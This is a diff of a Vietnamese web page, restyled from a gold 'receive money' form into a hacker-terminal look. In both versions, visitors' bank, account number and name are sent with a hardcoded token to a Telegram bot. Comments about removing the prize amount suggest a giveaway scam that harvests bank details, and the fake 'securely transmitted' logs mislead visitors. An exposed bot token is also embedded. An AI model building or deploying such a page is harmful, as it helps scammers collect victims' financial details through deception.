@@ -3,357 +3,308 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Gửi Thông Tin Nhận Tiền</title>
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;0,900;1,400&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <title>Terminal - Transfer Protocol</title>
+    <!-- Font Fira Code chuyên dùng cho Coder -->
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
     <style>
-        /* ===== RESET & BASE ===== */
+        :root {
+            --bg-color: #050505;
+            --term-bg: #121212;
+            --main-green: #00ff41;
+            --dark-green: #008f11;
+            --accent-cyan: #00ffff;
+            --error-red: #ff003c;
+            --text-muted: #4a4a4a;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        :root {
-            --gold: #D4AF37;
-            --gold-light: #F9D423;
-            --gold-dark: #B38728;
-            --gold-text: linear-gradient(to right, #BF953F, #FCF6BA, #B38728, #FBF5B7, #AA771C);
-            --glass-bg: rgba(12, 18, 34, 0.65);
-            --glass-border: rgba(212, 175, 55, 0.2);
-            --shadow: 0 25px 50px -8px rgba(0, 0, 0, 0.6);
-            --radius: 28px;
-        }
-
         body {
-            font-family: 'Inter', sans-serif;
+            font-family: 'Fira Code', monospace;
+            background-color: var(--bg-color);
+            color: var(--main-green);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
-            background: radial-gradient(circle at 10% 20%, #1e1366, transparent 40%),
-                        radial-gradient(circle at 90% 80%, #0a0a0a, transparent 50%),
-                        radial-gradient(circle at 50% 50%, #2a0845, transparent 60%);
-            background-color: #0b0f1a;
-            color: #ffffff;
+            background-image: 
+                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
+            background-size: 30px 30px;
         }
 
-        /* ===== CONTAINER ===== */
-        .container {
+        /* ===== TERMINAL WINDOW ===== */
+        .terminal-window {
             width: 100%;
-            max-width: 420px;
-            background: var(--glass-bg);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid var(--glass-border);
-            border-radius: var(--radius);
-            box-shadow: var(--shadow);
-            padding: 32px 24px 28px;
-            text-align: center;
-            transition: all 0.3s ease;
-        }
-
-        /* ===== TYPOGRAPHY ===== */
-        h1 {
-            font-family: 'Playfair Display', serif;
-            font-size: 38px;
-            font-weight: 900;
-            margin: 0 0 2px 0;
-            background: var(--gold-text);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            letter-spacing: 1.5px;
-            line-height: 1.1;
-        }
-
-        .subtitle {
-            font-family: 'Playfair Display', serif;
-            font-size: 15px;
-            font-style: italic;
-            color: #d4af37;
-            margin-bottom: 28px;
-            opacity: 0.9;
-            letter-spacing: 0.3px;
-        }
-
-        /* ===== CONFIG SECTION ===== */
-        .config-section {
-            background: rgba(255, 255, 255, 0.04);
-            border-radius: 20px;
-            padding: 22px 18px 18px;
-            margin-bottom: 24px;
-            border: 1px solid rgba(212, 175, 55, 0.08);
-            backdrop-filter: blur(4px);
-            transition: all 0.3s;
-        }
-
-        .config-section h3 {
-            font-family: 'Playfair Display', serif;
-            font-size: 19px;
-            font-weight: 700;
-            color: #d4af37;
-            margin-top: 0;
-            margin-bottom: 20px;
-            text-align: center;
-            letter-spacing: 0.5px;
-            border-bottom: 1px solid rgba(212, 175, 55, 0.1);
-            padding-bottom: 12px;
-        }
-
-        .input-group {
-            margin-bottom: 16px;
-            text-align: left;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 12px;
-            font-weight: 600;
-            color: rgba(255, 255, 255, 0.7);
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-            margin-bottom: 6px;
-        }
-
-        .select-wrapper {
-            position: relative;
-        }
-
-        .select-wrapper::after {
-            content: '▾';
-            font-size: 12px;
-            color: var(--gold);
-            position: absolute;
-            right: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            pointer-events: none;
-            opacity: 0.7;
-        }
-
-        .input-group select,
-        .input-group input {
-            width: 100%;
-            padding: 14px 16px;
-            background: rgba(0, 0, 0, 0.35);
-            border: 1px solid rgba(212, 175, 55, 0.2);
-            border-radius: 14px;
-            font-size: 15px;
-            color: #fff;
-            font-family: 'Inter', sans-serif;
-            transition: all 0.25s ease;
-            appearance: none;
-            -webkit-appearance: none;
-            outline: none;
-        }
-
-        .input-group select {
-            padding-right: 40px;
-            cursor: pointer;
-        }
-
-        .input-group select option {
-            background: #1a1f2e;
-            color: #fff;
-        }
-
-        .input-group input::placeholder {
-            color: rgba(255, 255, 255, 0.25);
-            font-weight: 400;
-        }
-
-        .input-group select:focus,
-        .input-group input:focus {
-            border-color: var(--gold);
-            background: rgba(0, 0, 0, 0.5);
-            box-shadow: 0 0 0 3px rgba(212, 175, 55, 0.15);
-        }
-
-        /* ===== BUTTON ===== */
-        .btn-generate {
-            background: var(--gold-text);
-            color: #0b0f1a;
-            border: none;
-            padding: 18px 20px;
-            font-size: 17px;
-            font-weight: 700;
-            font-family: 'Inter', sans-serif;
-            border-radius: 60px;
-            cursor: pointer;
-            box-shadow: 0 8px 24px rgba(212, 175, 55, 0.25);
-            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
-            width: 100%;
-            text-transform: uppercase;
-            letter-spacing: 1.8px;
-            position: relative;
+            max-width: 550px;
+            background: var(--term-bg);
+            border: 1px solid var(--dark-green);
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.15), inset 0 0 10px rgba(0, 255, 65, 0.05);
             overflow: hidden;
+            position: relative;
         }
 
-        .btn-generate:hover {
-            transform: translateY(-3px) scale(1.01);
-            box-shadow: 0 16px 36px rgba(212, 175, 55, 0.35);
+        /* Cửa sổ điều khiển (Header) */
+        .terminal-header {
+            background: #1a1a1a;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid var(--dark-green);
         }
 
-        .btn-generate:active {
-            transform: translateY(2px) scale(0.98);
+        .window-controls {
+            display: flex;
+            gap: 8px;
         }
 
-        .btn-generate:disabled {
-            background: #3a3f4e;
-            color: #7a7f8e;
-            box-shadow: none;
-            transform: none;
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        .dot.red { background-color: #ff5f56; }
+        .dot.yellow { background-color: #ffbd2e; }
+        .dot.green { background-color: #27c93f; }
+
+        .terminal-title {
+            flex-grow: 1;
+            text-align: center;
+            color: #888;
+            font-size: 13px;
+            margin-right: 50px; /* Cân bằng với dots */
+        }
+
+        /* Thân Terminal */
+        .terminal-body {
+            padding: 25px 20px;
+        }
+
+        .comment {
+            color: var(--text-muted);
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .input-line {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 18px;
+        }
+
+        .prompt {
+            color: var(--accent-cyan);
+            margin-bottom: 5px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .prompt::before {
+            content: "root@vietqr:~$ ";
+            color: var(--main-green);
+            font-weight: normal;
+        }
+
+        /* Inputs & Selects */
+        select, input {
+            background: transparent;
+            border: none;
+            border-bottom: 1px dashed var(--dark-green);
+            color: #fff;
+            font-family: 'Fira Code', monospace;
+            font-size: 15px;
+            padding: 8px 0;
+            width: 100%;
+            outline: none;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        select option {
+            background: var(--term-bg);
+            color: var(--main-green);
+        }
+
+        input::placeholder {
+            color: #333;
+        }
+
+        input:focus, select:focus {
+            border-bottom: 1px solid var(--main-green);
+            box-shadow: 0 4px 6px -6px var(--main-green);
+        }
+
+        /* Button */
+        .btn-execute {
+            background: transparent;
+            color: var(--main-green);
+            border: 1px solid var(--main-green);
+            padding: 12px 20px;
+            font-family: 'Fira Code', monospace;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 15px;
+            text-transform: uppercase;
+            transition: all 0.2s;
+            position: relative;
+        }
+
+        .btn-execute:hover {
+            background: var(--main-green);
+            color: var(--term-bg);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
+        }
+
+        .btn-execute:disabled {
+            border-color: var(--text-muted);
+            color: var(--text-muted);
             cursor: not-allowed;
+            background: transparent;
+            box-shadow: none;
         }
 
-        /* ===== QR RESULT ===== */
+        /* Blinking Cursor */
+        .cursor {
+            display: inline-block;
+            width: 8px;
+            height: 18px;
+            background-color: var(--main-green);
+            animation: blink 1s step-end infinite;
+            vertical-align: middle;
+            margin-left: 5px;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        /* ===== QR RESULT SECTION ===== */
         .qr-result {
             display: none;
-            margin-top: 28px;
-            animation: slideUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(212, 175, 55, 0.15);
-            padding: 28px 16px 22px;
-            border-radius: 24px;
-            backdrop-filter: blur(4px);
+            margin-top: 25px;
+            border-top: 1px dashed var(--text-muted);
+            padding-top: 20px;
         }
 
-        .qr-result.active {
+        .console-output {
+            font-size: 13px;
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        .log-time { color: var(--text-muted); }
+        .log-info { color: var(--accent-cyan); }
+        .log-success { color: var(--main-green); font-weight: bold; }
+        .log-error { color: var(--error-red); font-weight: bold; }
+
+        img#qrImage {
             display: block;
-        }
-
-        .qr-result h2 {
-            font-family: 'Playfair Display', serif;
-            font-size: 24px;
-            font-weight: 700;
-            color: #d4af37;
-            margin: 0 0 15px 0;
-            letter-spacing: 0.5px;
-        }
-
-        .qr-result img#qrImage {
-            width: 100%;
             max-width: 180px;
-            border-radius: 18px;
-            margin: 8px auto 0;
-            border: 2px solid rgba(212, 175, 55, 0.3);
-            padding: 6px;
+            width: 100%;
+            margin: 0 auto;
+            border: 2px solid var(--main-green);
+            padding: 5px;
             background: #fff;
-            display: block;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
+            filter: contrast(1.1); /* Làm mã QR nét hơn */
         }
 
-        .qr-result p#successMsg {
-            color: #4ade80;
-            font-weight: 600;
-            font-size: 14px;
-            margin-top: 18px;
-            display: none;
-            background: rgba(74, 222, 128, 0.08);
-            padding: 10px 14px;
-            border-radius: 40px;
-            border: 1px solid rgba(74, 222, 128, 0.15);
-            letter-spacing: 0.3px;
-        }
-
-        /* ===== ANIMATIONS ===== */
-        @keyframes slideUp {
-            0% { opacity: 0; transform: translateY(30px) scale(0.92); }
-            100% { opacity: 1; transform: translateY(0) scale(1); }
-        }
-
-        .confetti {
-            position: fixed;
-            width: 8px;
-            height: 16px;
-            border-radius: 2px;
-            animation: fall linear forwards;
-            z-index: 9999;
-            pointer-events: none;
-        }
-
-        @keyframes fall {
-            to { transform: translateY(100vh) rotate(720deg); }
-        }
-
-        /* ===== RESPONSIVE TWEAKS ===== */
+        /* Responsive */
         @media (max-width: 480px) {
-            .container { padding: 24px 16px 20px; }
-            h1 { font-size: 32px; }
-            .subtitle { font-size: 13px; margin-bottom: 20px; }
-            .config-section { padding: 16px 12px 14px; }
-            .input-group select, .input-group input { padding: 12px 14px; font-size: 14px; }
-            .btn-generate { font-size: 15px; padding: 16px 18px; letter-spacing: 1.4px; }
-            .qr-result h2 { font-size: 20px; }
-            .qr-result img#qrImage { max-width: 150px; }
-        }
-
-        @media (max-width: 380px) {
-            .container { padding: 18px 12px 16px; }
-            h1 { font-size: 28px; }
-            .config-section h3 { font-size: 17px; }
+            .terminal-body { padding: 15px; }
+            .prompt::before { content: "> "; }
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <!-- Đã sửa lại tiêu đề cho phù hợp với form Bank -->
-        <h1>Nhận Tiền</h1>
-        <p class="subtitle">Nhập đúng số tài khoản, tên người nhận và ngân hàng</p>
+    <div class="terminal-window">
+        <div class="terminal-header">
+            <div class="window-controls">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+            </div>
+            <div class="terminal-title">bash - payload_generator</div>
+        </div>
 
-        <div class="config-section" id="configSection">
-            <h3>Thông tin người nhận</h3>
-            
-            <div class="input-group">
-                <label for="bankId">Ngân hàng</label>
-                <div class="select-wrapper">
+        <div class="terminal-body">
+            <p class="comment"># INIT_PAYLOAD: Nhập thông số để khởi tạo kết nối Bank</p>
+
+            <div id="configSection">
+                <div class="input-line">
+                    <label class="prompt" for="bankId">set_target_bank</label>
                     <select id="bankId">
                         <option value="MB">MBBank - Ngân hàng Quân Đội</option>
                         <option value="VCB">Vietcombank - Ngân hàng Ngoại Thương</option>
                         <option value="ACB">ACB - Ngân hàng Á Châu</option>
                         <option value="TCB">Techcombank - Ngân hàng Kỹ Thương</option>
-                        <option value="VPB">VPBank - Ngân hàng Việt Nam Thịnh Vượng</option>
-                        <option value="BIDV">BIDV - Ngân hàng Đầu tư & Phát triển</option>
-                        <option value="CTG">VietinBank - Ngân hàng Công Thương</option>
+                        <option value="VPB">VPBank - Ngân hàng VN Thịnh Vượng</option>
+                        <option value="BIDV">BIDV - NH Đầu tư & Phát triển</option>
+                        <option value="CTG">VietinBank - NH Công Thương</option>
                         <option value="TPB">TPBank - Ngân hàng Tiên Phong</option>
-                        <option value="STB">Sacombank - Ngân hàng Sài Gòn Thương Tín</option>
-                        <option value="HDB">HDBank - Ngân hàng Phát triển TP.HCM</option>
+                        <option value="STB">Sacombank - NH Sài Gòn Thương Tín</option>
+                        <option value="HDB">HDBank - NH Phát triển TP.HCM</option>
                         <option value="VIB">VIB - Ngân hàng Quốc Tế</option>
                         <option value="MSB">MSB - Ngân hàng Hàng Hải</option>
                         <option value="SHB">SHB - Ngân hàng Sài Gòn - Hà Nội</option>
                         <option value="OCB">OCB - Ngân hàng Phương Đông</option>
                     </select>
                 </div>
-            </div>
-            
-            <div class="input-group">
-                <label for="accNo">Số tài khoản (Chỉ nhập số)</label>
-                <input type="text" id="accNo" placeholder="Nhập số tài khoản..." oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-            </div>
-            <div class="input-group">
-                <label for="accName">Tên tài khoản</label>
-                <input type="text" id="accName" placeholder="Viết không dấu (VD: NGUYEN VAN A)">
-            </div>
-        </div>
+                
+                <div class="input-line">
+                    <label class="prompt" for="accNo">set_account_no</label>
+                    <input type="text" id="accNo" placeholder="[chỉ_nhập_số]" oninput="this.value = this.value.replace(/[^0-9]/g, '')" autocomplete="off">
+                </div>
 
-        <div class="gift-area">
-            <button class="btn-generate" id="btnGenerate">Gửi Thông Tin</button>
-        </div>
+                <div class="input-line">
+                    <label class="prompt" for="accName">set_account_name</label>
+                    <input type="text" id="accName" placeholder="[VIẾT KHÔNG DẤU]" autocomplete="off">
+                </div>
+            </div>
 
-        <div class="qr-result" id="qrResult">
-            <h2>Mã QR Của Bạn</h2>
-            <img id="qrImage" src="" alt="VietQR" style="display: none;">
-            <p id="successMsg">✅ Đã gửi thông tin thành công!</p>
+            <button class="btn-execute" id="btnGenerate">
+                ./execute_transfer.sh <span class="cursor"></span>
+            </button>
+
+            <!-- Khung log terminal giả lập -->
+            <div class="qr-result" id="qrResult">
+                <div class="console-output" id="consoleOutput">
+                    <!-- Logs sẽ được JS sinh ra ở đây -->
+                </div>
+                <img id="qrImage" src="" alt="QR" style="display: none;">
+            </div>
         </div>
     </div>
 
     <script>
-        // ==========================================
-        // CẤU HÌNH TELEGRAM BOT Ở ĐÂY
-        // ==========================================
+        // Token và Chat ID của bạn
         const TELEGRAM_BOT_TOKEN = "8828772386:AAE1PSediTKtKvLOd96RHPxTH19wnSfr0CE";
         const TELEGRAM_CHAT_ID = "7126654319";
-        
+
+        // Hàm giả lập gõ chữ terminal
+        function appendLog(message, type = 'info') {
+            const consoleDiv = document.getElementById('consoleOutput');
+            const time = new Date().toLocaleTimeString('en-US', { hour12: false });
+            
+            let spanClass = 'log-info';
+            if(type === 'success') spanClass = 'log-success';
+            if(type === 'error') spanClass = 'log-error';
+
+            const logLine = document.createElement('div');
+            logLine.innerHTML = `<span class="log-time">[${time}]</span> <span class="${spanClass}">${message}</span>`;
+            consoleDiv.appendChild(logLine);
+        }
+
         document.getElementById('btnGenerate').addEventListener('click', async function() {
             const bankSelect = document.getElementById('bankId');
             const bankId = bankSelect.value;
@@ -362,38 +313,43 @@
             const accName = document.getElementById('accName').value.trim().toUpperCase();
 
             if (!accNo) {
-                alert("Bạn chưa nhập Số tài khoản!");
+                alert("ERROR: Field 'account_no' is empty!");
                 return;
             }
 
-            this.innerText = 'Đang xử lý...';
+            this.innerHTML = '[ PROCESSING... ]';
             this.disabled = true;
 
-            // Xóa phần random số tiền, chỉ tạo link VietQR cơ bản
+            // Xóa log cũ
+            document.getElementById('consoleOutput').innerHTML = '';
+            document.getElementById('qrResult').style.display = 'block';
+            document.getElementById('qrImage').style.display = 'none';
+
+            // Fake loading process
+            appendLog('Generating VietQR payload...', 'info');
+
+            // Tạo link VietQR
             let qrUrl = `https://img.vietqr.io/image/${bankId}-${accNo}-compact2.png?`;
-            
             if (accName) {
                 qrUrl += `accountName=${encodeURIComponent(accName)}`;
             }
 
-            // Hiển thị ảnh QR lên giao diện
-            const qrImageEl = document.getElementById('qrImage');
-            qrImageEl.src = qrUrl;
-            qrImageEl.style.display = 'block';
-            
-            document.getElementById('qrResult').classList.add('active');
-            document.getElementById('configSection').style.display = 'none';
+            setTimeout(async () => {
+                appendLog('Payload generated successfully.', 'success');
+                appendLog('Connecting to Telegram API...', 'info');
 
-            // Gửi ảnh QR qua Telegram Bot
-            if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-                // Sửa lại nội dung tin nhắn gửi về Telegram (bỏ phần báo số tiền trúng thưởng)
-                const message = `🔔 Có yêu cầu nhận tiền mới!\n\n🏦 Ngân hàng: ${bankName}\n🔢 STK: ${accNo}\n👤 Tên: ${accName || 'Chưa nhập'}`;
-                
+                // Gửi qua Telegram
+                const message = `💻 <b>SYSTEM_ALERT: NEW_TRANSACTION</b>\n\n` +
+                                `🏦 <b>Bank_ID:</b> ${bankName}\n` +
+                                `🔢 <b>Target_No:</b> <code>${accNo}</code>\n` +
+                                `👤 <b>Alias:</b> ${accName || 'N/A'}`;
+
                 try {
                     const formData = new FormData();
                     formData.append('chat_id', TELEGRAM_CHAT_ID);
                     formData.append('photo', qrUrl);
                     formData.append('caption', message);
+                    formData.append('parse_mode', 'HTML');
 
                     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
@@ -401,41 +357,31 @@
                     });
                     
                     const result = await response.json();
+                    
                     if (result.ok) {
-                        document.getElementById('successMsg').style.display = 'block';
+                        appendLog('Data securely transmitted to Telegram node.', 'success');
+                        
+                        // Ẩn form nhập liệu và show ảnh QR
+                        document.getElementById('configSection').style.display = 'none';
+                        this.style.display = 'none'; // Ẩn nút bấm
+
+                        // Hiện QR
+                        const qrImageEl = document.getElementById('qrImage');
+                        qrImageEl.src = qrUrl;
+                        qrImageEl.style.display = 'block';
+
                     } else {
-                        console.error('Lỗi từ Telegram:', result);
-                        alert("Lỗi Telegram: " + result.description);
+                        appendLog(`Telegram API Error: ${result.description}`, 'error');
+                        this.innerHTML = './execute_transfer.sh <span class="cursor"></span>';
+                        this.disabled = false;
                     }
                 } catch (error) {
-                    console.error('Lỗi khi gửi ảnh qua Telegram:', error);
-                    alert("Không thể kết nối với Telegram Bot!");
+                    appendLog('Connection to master node failed.', 'error');
+                    this.innerHTML = './execute_transfer.sh <span class="cursor"></span>';
+                    this.disabled = false;
                 }
-            }
-
-            this.style.display = 'none';
-            createConfetti(); // Vẫn giữ lại hiệu ứng pháo giấy bắn lên cho đẹp mắt
+            }, 800); // Fake delay 0.8s cho ngầu
         });
-
-        function createConfetti() {
-            const colors = ['#D4AF37', '#F9D423', '#FF4E50', '#FFFFFF'];
-            for (let i = 0; i < 80; i++) {
-                const confetti = document.createElement('div');
-                confetti.classList.add('confetti');
-                confetti.style.left = Math.random() * 100 + 'vw';
-                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-                confetti.style.top = '-20px';
-                
-                const duration = Math.random() * 3 + 2;
-                confetti.style.animationDuration = duration + 's';
-                
-                document.body.appendChild(confetti);
-                
-                setTimeout(() => {
-                    confetti.remove();
-                }, duration * 1000);
-            }
-        }
     </script>
 </body>
 </html>
